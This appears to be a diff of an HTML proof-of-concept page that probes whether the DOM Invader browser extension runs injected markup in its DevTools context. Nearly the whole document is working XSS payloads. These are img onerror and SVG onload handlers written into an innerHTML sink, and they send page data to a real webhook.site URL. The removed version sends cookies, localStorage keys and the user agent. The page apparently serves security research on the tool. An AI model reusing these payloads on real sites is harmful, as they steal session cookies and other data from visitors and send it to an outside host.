@@ -2,209 +2,66 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>DOM Invader - Definitive Context Test</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-poc2026'; connect-src *; img-src *; style-src 'unsafe-inline';">
+    <title>CSP Protected - Final Test</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0a;
-            color: #e0e0e0;
-            font-family: 'Courier New', monospace;
-            padding: 30px;
-        }
-        h1 { color: #00ff88; font-size: 1.3em; text-align: center; margin-bottom: 5px; }
-        .sub { color: #888; text-align: center; font-size: 0.8em; margin-bottom: 25px; }
-        .box {
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 6px;
-            padding: 15px;
-            margin-bottom: 20px;
-            font-size: 0.82em;
-            line-height: 1.7;
-        }
-        .box.warn { border-color: #f1c40f; }
-        .box.info { border-color: #3498db; }
-        .box strong { color: #00ff88; }
-        .box em { color: #f1c40f; font-style: normal; }
-
-        button {
-            display: block;
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto 15px;
-            padding: 14px;
-            background: #1a1a2e;
-            color: #00ff88;
-            border: 2px solid #00ff88;
-            font-family: 'Courier New', monospace;
-            font-size: 1em;
-            cursor: pointer;
-            border-radius: 6px;
-            transition: all 0.2s;
-        }
-        button:hover { background: #00ff88; color: #0a0a0a; }
-        button.red { border-color: #e74c3c; color: #e74c3c; }
-        button.red:hover { background: #e74c3c; color: #fff; }
-
-        #log {
-            background: #0d0d0d;
-            border: 1px solid #333;
-            border-radius: 6px;
-            padding: 12px;
-            height: 300px;
-            overflow-y: auto;
-            font-size: 0.78em;
-            line-height: 1.8;
-        }
-        .l-g { color: #2ecc71; }
-        .l-y { color: #f1c40f; }
-        .l-b { color: #3498db; }
-        .l-r { color: #e74c3c; }
-
-        /* Hidden sink target - display:none so it doesn't affect page visually */
-        #sink-target { display: none; }
+        body { background:#0a0a0a; color:#e0e0e0; font-family:'Courier New',monospace; padding:30px; }
+        h1 { color:#00ff88; text-align:center; font-size:1.2em; }
+        .note { background:#1a1a2e; border:1px solid #e74c3c; border-radius:6px; padding:15px; margin:20px 0; font-size:0.85em; line-height:1.7; }
+        .note b { color:#e74c3c; } .note em { color:#f1c40f; font-style:normal; }
+        input { padding:10px; width:300px; background:#111; color:#0f0; border:1px solid #333; font-family:inherit; margin:5px; }
+        button { padding:12px 24px; background:#1a1a2e; color:#00ff88; border:2px solid #00ff88; font-family:inherit; cursor:pointer; border-radius:4px; margin:5px; }
+        button:hover { background:#00ff88; color:#000; }
+        #log { background:#111; border:1px solid #333; border-radius:6px; padding:12px; margin-top:20px; height:250px; overflow-y:auto; font-size:0.8em; line-height:1.8; }
+        .g{color:#2ecc71} .y{color:#f1c40f} .r{color:#e74c3c} .b{color:#3498db}
+        #sink-target { display:none; }
     </style>
 </head>
 <body>
-
-<h1>[ DOM INVADER — DEFINITIVE CONTEXT TEST ]</h1>
-<p class="sub">This test PROVES where code executes: Page vs DevTools Extension Context</p>
-
-<div class="box warn">
-    <strong>HOW THIS WORKS:</strong><br>
-    This page triggers a <em>real innerHTML sink</em> so DOM Invader detects it.<br>
-    The payload sends a webhook request with the <em>exact execution context</em>
-    (URL, protocol, chrome APIs, document.title).<br><br>
-    <strong>KEY:</strong> If you receive <em>TWO separate webhook requests</em>:<br>
-    • Request #1: from <em>https://your-page-url</em> (page context — this is expected/normal)<br>
-    • Request #2: from <em>chrome-extension://</em> or <em>devtools://</em> (extension context — THIS IS THE VULNERABILITY)<br><br>
-    If only ONE request arrives (from the page) → No vulnerability.
+<h1>[ FINAL TEST — CSP PROTECTED PAGE ]</h1>
+<div class="note">
+    <b>KEY CONCEPT:</b> This page has <em>strict CSP</em> — img onerror will <em>NOT</em> execute here.<br>
+    If DOM Invader re-renders the sink value in DevTools (no CSP there), the payload fires.<br><br>
+    <b>0 webhook requests = No vulnerability</b><br>
+    <b>1 webhook request = VULNERABILITY CONFIRMED</b> (code ran in DevTools context)
 </div>
 
-<div class="box info">
-    <strong>STEPS:</strong><br>
-    1. Make sure DOM Invader is ON + Augmented DOM is ON<br>
-    2. Click "TRIGGER SINK" below<br>
-    3. Open DevTools → DOM Invader tab → you should see a Sink entry<br>
-    4. Press Esc for Console<br>
-    5. Click the <em>Stack Trace</em> link in the sinks table<br>
-    6. Check webhook — count how many requests you received
+<div>
+    <label>DOM Invader Canary (copy from DOM Invader UI):</label><br>
+    <input type="text" id="canary-input" placeholder="e.g. n3b4imp">
+    <button id="trigger-btn">⚡ TRIGGER SINK</button>
 </div>
-
-<button onclick="triggerSink()">⚡ TRIGGER SINK (innerHTML with context payload)</button>
-<button class="red" onclick="triggerSinkAlt()">⚡ ALT: SVG + Script Tag Test</button>
-
 <div id="log"></div>
-
-<!-- Hidden element where the real innerHTML sink happens -->
 <div id="sink-target"></div>
 
-<script>
-    const WEBHOOK = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
-    const CANARY  = "z0mb1epq";  // Must look like a DOM Invader canary
-    const logEl   = document.getElementById('log');
+<script nonce="poc2026">
+    var WEBHOOK = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
+    var logEl = document.getElementById('log');
 
-    function log(msg, cls = 'l-b') {
-        const ts = new Date().toLocaleTimeString();
-        logEl.innerHTML += `<div class="${cls}">[${ts}] ${msg}</div>`;
+    function log(m, c) {
+        logEl.innerHTML += '<div class="'+(c||'b')+'">['+new Date().toLocaleTimeString()+'] '+m+'</div>';
         logEl.scrollTop = logEl.scrollHeight;
     }
 
-    // =====================================================
-    //  MAIN TEST: Context-Aware Payload via real innerHTML
-    //
-    //  The payload, when executed, reports:
-    //   - window.location.href  (page URL vs chrome-extension://)
-    //   - window.location.protocol
-    //   - document.title
-    //   - Whether chrome.devtools API exists
-    //   - Whether chrome.runtime API exists
-    //   - Timestamp (to distinguish multiple executions)
-    // =====================================================
+    document.getElementById('trigger-btn').addEventListener('click', function() {
+        var canary = document.getElementById('canary-input').value.trim();
+        if (!canary) { log('Enter DOM Invader canary first!','r'); return; }
 
-    function triggerSink() {
-        log("━━━ TRIGGERING REAL innerHTML SINK ━━━", 'l-y');
+        log('Canary: ' + canary, 'b');
+        log('CSP active — img onerror BLOCKED on this page', 'y');
 
-        // Generate unique execution ID
-        const execId = Date.now();
+        var payload = canary + '<img src=x onerror="fetch(\'' + WEBHOOK + '?csp_bypass=1&proto=\'+location.protocol+\'&url=\'+encodeURIComponent(location.href),{mode:\'no-cors\'});alert(\'EXECUTED IN: \'+location.protocol+\'//\'+location.host)">';
 
-        // The payload: an img tag whose onerror sends full context to webhook
-        // If this executes on the PAGE, you'll see protocol=https: and the page URL
-        // If this executes in DEVTOOLS, you'll see protocol=chrome-extension: or devtools:
-        const payload = CANARY +
-            `<img src="x" onerror="` +
-            // Build context object
-            `var _c={` +
-                `exec_id:${execId},` +
-                `exec_time:new Date().toISOString(),` +
-                `location_href:window.location.href,` +
-                `location_protocol:window.location.protocol,` +
-                `location_origin:window.location.origin,` +
-                `document_title:document.title,` +
-                `document_url:document.URL,` +
-                `has_chrome:typeof chrome!=='undefined',` +
-                `has_chrome_runtime:!!(typeof chrome!=='undefined'&amp;&amp;chrome.runtime),` +
-                `has_chrome_devtools:!!(typeof chrome!=='undefined'&amp;&amp;chrome.devtools),` +
-                `has_chrome_tabs:!!(typeof chrome!=='undefined'&amp;&amp;chrome.tabs),` +
-                `cookie:document.cookie||'none',` +
-                `ls_keys:JSON.stringify(Object.keys(localStorage)),` +
-                `user_agent:navigator.userAgent.substring(0,100)` +
-            `};` +
-            // Send to webhook
-            `fetch('${WEBHOOK}?exec_id=${execId}',` +
-                `{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},` +
-                `body:JSON.stringify(_c)});` +
-            // Visual confirmation
-            `alert('CODE EXECUTED!\\n\\nProtocol: '+_c.location_protocol+` +
-                `'\\nURL: '+_c.location_href.substring(0,80)+` +
-                `'\\nDevTools API: '+_c.has_chrome_devtools+` +
-                `'\\nRuntime API: '+_c.has_chrome_runtime)` +
-            `">`;
-
-        log(`Canary: <b>${CANARY}</b>`, 'l-b');
-        log(`Exec ID: <b>${execId}</b> (check webhook for this ID)`, 'l-b');
-        log("Setting innerHTML on hidden #sink-target element...", 'l-g');
-
-        // THIS is the real DOM sink - DOM Invader should detect this
         document.getElementById('sink-target').innerHTML = payload;
 
-        log("✅ innerHTML sink triggered!", 'l-g');
-        log("If an alert appeared → that's execution on THIS PAGE (expected)", 'l-y');
-        log("Now open DevTools → DOM Invader → Click Stack Trace", 'l-y');
-        log("If a SECOND alert appears → VULNERABILITY CONFIRMED", 'l-r');
-        log("Check webhook for requests with exec_id=" + execId, 'l-y');
-        log("TWO requests = vulnerability. ONE request = no vulnerability.", 'l-r');
-    }
+        log('innerHTML set with payload + canary', 'g');
+        log('CSP should have BLOCKED execution on this page (no alert = correct)', 'y');
+        log('Now: DevTools → DOM Invader → Check Sinks table → Click Stack Trace', 'r');
+        log('If webhook receives request → VULNERABILITY PROVEN', 'r');
+    });
 
-    // =====================================================
-    //  ALTERNATIVE TEST: Different payload vectors
-    // =====================================================
-
-    function triggerSinkAlt() {
-        log("━━━ ALT TEST: SVG + Script vectors ━━━", 'l-y');
-
-        const execId = Date.now();
-
-        // Test 1: SVG onload (different rendering path)
-        const svgPayload = CANARY +
-            `<svg><svg onload="fetch('${WEBHOOK}?alt_svg=${execId}&amp;proto='+location.protocol,{mode:'no-cors'});alert('SVG exec: '+location.protocol+'//'+location.host)"></svg>`;
-
-        log("Setting innerHTML with SVG payload...", 'l-g');
-        document.getElementById('sink-target').innerHTML = svgPayload;
-
-        log("✅ SVG sink triggered! Exec ID: " + execId, 'l-g');
-        log("Same instructions: check DOM Invader sinks table and click Stack Trace", 'l-y');
-    }
-
-    // =====================================================
-    //  Startup
-    // =====================================================
-    log("Definitive Context Test loaded.", 'l-b');
-    log("Webhook: " + WEBHOOK, 'l-b');
-    log("This page WILL use innerHTML (required for DOM Invader to detect a sink).", 'l-y');
-    log("The payload identifies WHERE it executes and sends proof to webhook.", 'l-b');
-    log("Click a button above to start.", 'l-g');
+    log('Page loaded with strict CSP: script-src nonce-only', 'b');
+    log('Paste DOM Invader canary and click TRIGGER SINK', 'y');
 </script>
-
 </body>
 </html>
